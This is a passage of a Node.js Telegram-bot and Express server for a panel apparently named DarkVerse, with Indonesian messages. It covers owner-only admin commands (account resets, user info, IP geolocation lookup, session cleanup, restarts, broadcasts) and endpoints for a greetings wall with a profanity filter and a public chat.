      `✅ *Akun trial berhasil dibuat!*\n\n👤 Username: \`${username}\`\n🔐 Password: \`${password}\`\n📅 Aktif hingga: *${expiredStr}*\n\n⚠️ Trial hanya berlaku *1 hari* dan tidak bisa diperpanjang.`,
      { parse_mode: 'Markdown' }
    );
  });
});


bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*DarkVerse Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun by role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// ===== FITUR /deleteallvip =====
function registerDeleteAllVip() {
  bot.onText(/^\/?deleteallvip$/i, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID) {
      return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    const db = loadDatabase();
    const vipUsers = db.filter(u => normalizeRoleName(u.role || "member") === "vip");

    if (vipUsers.length === 0) {
      return bot.sendMessage(chatId, "ℹ️ Tidak ada akun dengan role VIP.");
    }

    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: `✅ Konfirmasi Hapus ${vipUsers.length} Akun VIP`, callback_data: "confirm_deleteallvip" }],
          [{ text: "❌ Batal", callback_data: "cancel_deleteallvip" }]
        ]
      }
    };

    bot.sendMessage(chatId,
      `⚠️ Apakah kamu yakin ingin menghapus *${vipUsers.length} akun VIP*?\n\nDaftar:\n` +
      vipUsers.map(u => `• ${u.username} (exp: ${u.expiredDate})`).join("\n"),
      opts
    );
  });

  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === "confirm_deleteallvip") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Tidak diizinkan.", show_alert: true });
      }

      const db = loadDatabase();
      const vipUsers = db.filter(u => normalizeRoleName(u.role || "member") === "vip");
      const remaining = db.filter(u => normalizeRoleName(u.role || "member") !== "vip");

      if (vipUsers.length === 0) {
        bot.answerCallbackQuery(query.id, { text: "ℹ️ Tidak ada VIP ditemukan." });
        return bot.sendMessage(chatId, "ℹ️ Tidak ada akun VIP untuk dihapus.");
      }

      saveDatabase(remaining);

      // Hapus session masing-masing VIP (opsional tapi bersih)
      for (const user of vipUsers) {
        const userFolder = path.join("permenmd", user.username);
        if (fs.existsSync(userFolder)) {
          fs.rmSync(userFolder, { recursive: true, force: true });
          console.log(`🧹 Session folder deleted: ${userFolder}`);
        }
      }

      // Catat ke log
      const logLine = `OWNER deleted all VIP accounts (${vipUsers.length}): ${vipUsers.map(u => u.username).join(", ")}\n`;
      fs.appendFileSync("logUser.txt", logLine);

      // Simpan laporan ke file
      const report = vipUsers.map(u => `${u.username} | exp: ${u.expiredDate}`).join("\n");
      const reportPath = "./deleted_vip_report.txt";
      fs.writeFileSync(reportPath, report);

      bot.answerCallbackQuery(query.id, { text: `✅ ${vipUsers.length} akun VIP dihapus.` });

      await bot.sendDocument(chatId, reportPath, {
        caption: `🗑️ *Berhasil menghapus ${vipUsers.length} akun VIP.*`,
        parse_mode: "Markdown"
      });

      sendToGroups(
        `🗑️ *Semua Akun VIP Dihapus*\nTotal: ${vipUsers.length} akun\nOleh: Owner`,
        { parse_mode: "Markdown" }
      );

      return;
    }

    if (data === "cancel_deleteallvip") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Tidak diizinkan.", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi dibatalkan.");
    }
  });
}

registerDeleteAllVip();
// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    // === Load database user ===
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const statsRoles = [
      ["developer", "Developer"],
      ["all_access", "All Access"],
      ["owner_vip", "Owner VIP"],
      ["owner", "Owner"],
      ["tk", "TK"],
      ["pt", "PT"],
      ["admin", "Admin"],
      ["reseller", "Reseller"],
      ["vip", "VIP"],
      ["member", "Member"],
    ];
    const countRole = (role) =>
      users.filter(u => normalizeRoleName(u.role || "member") === role).length;
    const roleStatsText = statsRoles
      .map(([role, label]) => `• ${label}: ${countRole(role)}`)
      .join("\n");

    // === Cek session WhatsApp aktif (jika pakai Baileys MD) ===
    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    // === Buat tampilan stats ===
    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
${roleStatsText}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder permenmd
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      // Cek apakah folder berisi file .json
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

// ===== FITUR RESTART MANUAL (SAMA GAYA DENGAN AUTO RESTART) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  sendToGroupsUtama("🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...", { parse_mode: "Markdown" });
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    sendToGroupsUtama("🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!", { parse_mode: "Markdown" });
  }, 8000); // kirim pesan sukses setelah 8 detik

  // Tunggu 5 detik lalu restart
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// ===== FITUR RESET PANEL (TANPA RESTART SERVER) =====
bot.onText(/^\/?resetpanel$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const confirmMsg = await bot.sendMessage(chatId, "⚠️ Yakin ingin *reset panel*?\nSemua koneksi WebSocket dan WhatsApp akan dihentikan dan disambungkan ulang.", {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Ya, Reset", callback_data: "confirm_resetpanel" },
          { text: "❌ Batal", callback_data: "cancel_resetpanel" }
        ]
      ]
    }
  });
});

// ===== FUNGSI RESET PANEL =====
async function doResetPanel() {
  console.log("🔄 Resetting panel...");

  // Close all WebSocket connections
  for (const [user, ws] of Object.entries(wsClients)) {
    try { ws.close(1001, 'Panel reset'); } catch (_) { }
  }
  wsClients = {};

  // Clear all keepalive intervals
  for (const [user, ws] of Object.entries(wsClients)) {
    if (ws._keepAliveInterval) clearInterval(ws._keepAliveInterval);
  }

  // Close all VPS SSH connections
  for (const [name, conn] of Object.entries(vpsConnections)) {
    try { conn.end(); } catch (_) { }
  }

  // Send notification
  sendToGroupsUtama("🟣 *Status Panel:*\n🔄 Panel berhasil di-reset. Semua koneksi dimulai ulang.", { parse_mode: "Markdown" });
  console.log("✅ Panel reset completed.");
}

// Fungsi upload gambar ke catbox.moe
async function uploadToCatbox(url) {
  try {
    const { data } = await axios.post('https://catbox.moe/user/api.php', null, {
      params: {
        reqtype: 'urlupload',
        url: url
      }
    });
    const result = data.trim();
    if (result.startsWith('https://')) return result;
    return url;
  } catch (e) {
    console.error('Catbox upload error:', e.message);
    return url;
  }
}

// ===== FITUR BROADCAST NEWS =====
// Format: /broadcast <title> | <desc> [| <image_url>]
bot.onText(/^\/?broadcast\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const parts = match[1].split('|').map(s => s.trim());
  const title = parts[0];
  const desc = parts[1] || '';
  const image = parts[2] || '';

  if (!title) {
    return bot.sendMessage(chatId, "⚠️ Format: `/broadcast Judul | Deskripsi | https://gambar.url`\n\nImage URL opsional.", { parse_mode: "Markdown" });
  }

  // Upload gambar ke catbox jika ada
  let imageFinal = image || '';
  if (image) {
    imageFinal = await uploadToCatbox(image);
  }

  const newItem = {
    title,
    desc,
    image: imageFinal,
    created_at: new Date().toISOString()
  };

  newsCache.unshift(newItem);
  saveNews(newsCache);

  bot.sendMessage(chatId, `✅ Broadcast terkirim!\n\n📰 *${title}*\n${desc}\n\nTotal broadcast: ${newsCache.length}`, { parse_mode: "Markdown" });

  sendToGroups(`📢 *Broadcast Baru*\n\n*${title}*\n${desc}`, { parse_mode: "Markdown" });

  // Kirim ke public chat
  const broadcastMsg = {
    id: Date.now().toString(),
    username: "📢 Broadcast",
    role: "owner",
    message: `📢 ${title}\n${desc}`,
    timestamp: new Date().toISOString()
  };
  publicMessages.push(broadcastMsg);
  if (publicMessages.length > 1000) {
    publicMessages = publicMessages.slice(-1000);
  }
  savePublicChat();

  // Broadcast real-time ke semua client WebSocket
  broadcastToAll({
    type: 'broadcast',
    data: {
      title,
      desc,
      image: imageFinal,
      created_at: newItem.created_at
    }
  });
});

// ===== Endpoint GET /api/news =====
app.get("/api/news", (req, res) => {
  newsCache = loadNews();
  res.json({ success: true, news: newsCache });
});

// ===================== FITUR UCAPAN (REAL-TIME) =====================

let ucapanList = [];
const UCAPAN_FILE = 'ucapan.json';

// Saat load, pastikan setiap ucapan punya likedBy & dislikedBy
function loadUcapan() {
  try {
    if (fs.existsSync(UCAPAN_FILE)) {
      ucapanList = JSON.parse(fs.readFileSync(UCAPAN_FILE, 'utf8'));
      // Migrasi data lama
      ucapanList = ucapanList.map(u => ({
        ...u,
        likedBy: u.likedBy || [],
        dislikedBy: u.dislikedBy || []
      }));
      console.log(`📜 Loaded ${ucapanList.length} ucapan from file`);
    }
  } catch (e) {
    console.error("Error loading ucapan:", e);
    ucapanList = [];
  }
}

function saveUcapan() {
  fs.writeFileSync(UCAPAN_FILE, JSON.stringify(ucapanList, null, 2));
}

// GET /getUcapan - Ambil semua ucapan
app.get("/getUcapan", (req, res) => {
  const { key } = req.query;

  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }

  // Balik urutan (terbaru di atas)
  const sortedUcapan = [...ucapanList].reverse();

  res.json({
    valid: true,
    ucapan: sortedUcapan
  });
});

// POST /addUcapan - Tambah ucapan baru (dengan filter kata kasar)
const kasarWords = [
  'anjing', 'bangsat', 'kontol', 'memek', 'ngentot', 'jembut', 'peler',
  'toket', 'goblok', 'tolol', 'babi', 'asu', 'sialan', 'brengsek',
  'kampret', 'bajingan', 'tai', 'ampas', 'setan', 'iblis'
];

function filterKataKasar(text) {
  let filtered = text;
  for (const word of kasarWords) {
    const regex = new RegExp(word, 'gi');
    filtered = filtered.replace(regex, '****');
  }
  return filtered;
}

app.post("/addUcapan", (req, res) => {
  const { key, nama, pesan } = req.body;

  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }

  if (!nama || !pesan) {
    return res.json({ valid: false, message: "Nama dan pesan wajib diisi" });
  }

  if (pesan.length > 500) {
    return res.json({ valid: false, message: "Pesan terlalu panjang (max 500 karakter)" });
  }

  // Filter kata kasar
  const filteredNama = filterKataKasar(nama);
  const filteredPesan = filterKataKasar(pesan);

  const newUcapan = {
    id: Date.now().toString(),
    nama: filteredNama,
    pesan: filteredPesan,
    waktu: new Date().toISOString(),
    likes: 0,
    dislikes: 0
  };

  ucapanList.push(newUcapan);
  saveUcapan();

  // Broadcast ke semua client WebSocket yang terhubung
  broadcastToAll({
    type: 'newUcapan',
    data: newUcapan
  });

  res.json({
    valid: true,
    ucapan: newUcapan
  });
});

// POST /likeUcapan - Like/dislike ucapan (cuma sekali per user)
app.post("/likeUcapan", (req, res) => {
  const { key, id, type } = req.body; // type: 'like' atau 'dislike'

  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  const index = ucapanList.findIndex(u => u.id === id);
  if (index === -1) {
    return res.json({ valid: false, message: "Ucapan tidak ditemukan" });
  }

  const ucapan = ucapanList[index];

  // Inisialisasi array jika belum ada
  if (!ucapan.likedBy) ucapan.likedBy = [];
  if (!ucapan.dislikedBy) ucapan.dislikedBy = [];

  const alreadyLiked = ucapan.likedBy.includes(user.username);
  const alreadyDisliked = ucapan.dislikedBy.includes(user.username);

  // LIKE
  if (type === 'like') {
    if (alreadyLiked) {
      // Batal like (unlike)
      ucapan.likes = (ucapan.likes || 1) - 1;
      ucapan.likedBy = ucapan.likedBy.filter(u => u !== user.username);
      return res.json({
        valid: true,
        action: 'unliked',
        likes: ucapan.likes,
        dislikes: ucapan.dislikes || 0
      });
    }

    if (alreadyDisliked) {
      // Hapus dislike dulu, baru like
      ucapan.dislikes = (ucapan.dislikes || 1) - 1;
      ucapan.dislikedBy = ucapan.dislikedBy.filter(u => u !== user.username);
    }

    // Tambah like
    ucapan.likes = (ucapan.likes || 0) + 1;
    ucapan.likedBy.push(user.username);

    saveUcapan();
    broadcastToAll({
      type: 'updateUcapan',
      data: ucapan
    });

    return res.json({
      valid: true,
      action: 'liked',
      likes: ucapan.likes,
      dislikes: ucapan.dislikes || 0
    });
  }

  // DISLIKE
  if (type === 'dislike') {
    if (alreadyDisliked) {
      // Batal dislike
      ucapan.dislikes = (ucapan.dislikes || 1) - 1;
      ucapan.dislikedBy = ucapan.dislikedBy.filter(u => u !== user.username);
      return res.json({
        valid: true,
        action: 'undisliked',
        likes: ucapan.likes || 0,
        dislikes: ucapan.dislikes
      });
    }

    if (alreadyLiked) {
      // Hapus like dulu, baru dislike
      ucapan.likes = (ucapan.likes || 1) - 1;
      ucapan.likedBy = ucapan.likedBy.filter(u => u !== user.username);
    }

    // Tambah dislike
    ucapan.dislikes = (ucapan.dislikes || 0) + 1;
    ucapan.dislikedBy.push(user.username);

    saveUcapan();
    broadcastToAll({
      type: 'updateUcapan',
      data: ucapan
    });

    return res.json({
      valid: true,
      action: 'disliked',
      likes: ucapan.likes || 0,
      dislikes: ucapan.dislikes
    });
  }

  res.json({ valid: false, message: "Invalid type" });
});

// DELETE /deleteUcapan - Hapus ucapan (hanya owner)
app.delete("/deleteUcapan", (req, res) => {
  const { key, id } = req.body;

  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  // Hanya owner yang bisa hapus
  if (!user || user.role !== 'owner') {
    return res.json({ valid: false, message: "Only owner can delete" });
  }

  const index = ucapanList.findIndex(u => u.id === id);
  if (index === -1) {
    return res.json({ valid: false, message: "Ucapan tidak ditemukan" });
  }

  ucapanList.splice(index, 1);
  saveUcapan();

  broadcastToAll({
    type: 'deleteUcapan',
    id: id
  });

  res.json({ valid: true, message: "Ucapan dihapus" });
});

// Fungsi broadcast ke semua WebSocket client
function broadcastToAll(data) {
  const message = JSON.stringify(data);
  for (const client of Object.values(wsClients)) {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  }
}

// Load ucapan saat server start
loadUcapan();

// ===================== PUBLIC CHAT =====================

let publicMessages = [];
const PUBLIC_CHAT_FILE = 'public_chat.json';

// Load chat history
function loadPublicChat() {
  try {
    if (fs.existsSync(PUBLIC_CHAT_FILE)) {
      publicMessages = JSON.parse(fs.readFileSync(PUBLIC_CHAT_FILE, 'utf8'));
      console.log(`💬 Loaded ${publicMessages.length} public messages`);
    }
  } catch (e) {
    console.error("Error loading public chat:", e);
    publicMessages = [];
  }
}

function savePublicChat() {
  fs.writeFileSync(PUBLIC_CHAT_FILE, JSON.stringify(publicMessages, null, 2));
}

// Format waktu relatif
function formatRelativeTime(timestamp) {
  const now = new Date();
  const then = new Date(timestamp);
  const diffMs = now - then;
  const diffSec = Math.floor(diffMs / 1000);
  const diffMin = Math.floor(diffSec / 60);
  const diffHour = Math.floor(diffMin / 60);
  const diffDay = Math.floor(diffHour / 24);
  const diffWeek = Math.floor(diffDay / 7);
  const diffMonth = Math.floor(diffDay / 30);
  const diffYear = Math.floor(diffDay / 365);

  if (diffSec < 10) return "baru saja";
  if (diffSec < 60) return `${diffSec} detik lalu`;
  if (diffMin < 60) return `${diffMin} menit lalu`;
  if (diffHour < 24) return `${diffHour} jam lalu`;
  if (diffDay < 7) return `${diffDay} hari lalu`;
  if (diffWeek < 4) return `${diffWeek} minggu lalu`;
  if (diffMonth < 12) return `${diffMonth} bulan lalu`;
  return `${diffYear} tahun lalu`;
}

// GET /getPublicChat - Ambil semua pesan
app.get("/getPublicChat", (req, res) => {
  const { key, lastId } = req.query;

  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }

  let messages = [...publicMessages].reverse();

  // Jika ada lastId, ambil pesan baru saja
  if (lastId) {
    const lastIndex = messages.findIndex(m => m.id === lastId);
    if (lastIndex !== -1) {
      messages = messages.splice(0, lastIndex);
    }
  }

  // Tambahkan formatted time
  const messagesWithFormat = messages.map(msg => ({
    ...msg,
    formattedTime: formatRelativeTime(msg.timestamp)
  }));

  res.json({
    valid: true,
    messages: messagesWithFormat,
    total: publicMessages.length
  });
});

// POST /sendPublicChat - Kirim pesan
app.post("/sendPublicChat", (req, res) => {
  const { key, message } = req.body;

  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }

